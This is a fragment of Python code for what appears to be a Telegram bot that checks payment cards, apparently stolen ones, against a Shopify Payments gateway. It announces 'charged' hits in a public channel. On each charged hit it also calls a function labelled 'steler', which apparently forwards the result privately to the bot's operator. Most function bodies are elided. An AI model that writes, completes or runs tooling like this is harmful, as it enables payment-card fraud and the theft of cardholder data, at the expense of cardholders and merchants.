...
async def send_public_log(result, user_id, username, hit_type):
    """Send HIT DETECTED to PUBLIC channel (NO CARD NUMBER)"""
    ...
    # Format message with NO CARD - public friendly
    message = f"""<b>⚡ 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗 ⚡</b>
━━━━━━━━━━━━━━━━━━━
<b>🔥 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>
━━━━━━━━━━━━━━━━━━━
🌐 <b>Gateway:</b> {result.get('gateway', 'Shopify Payments')}
...
async def send_realtime_hit(user_id, result, hit_type, username):
    ...
    if hit_type == "Charged":
        await send_private_steler(result, user_id, username, hit_type)
        await send_public_log(result, user_id, username, hit_type)
    # ==== END STELER ====
...
🤖 <b>Bot By: <a href="tg://user?id=7124544715">ㅤㅤK A S I M</a></b>"""
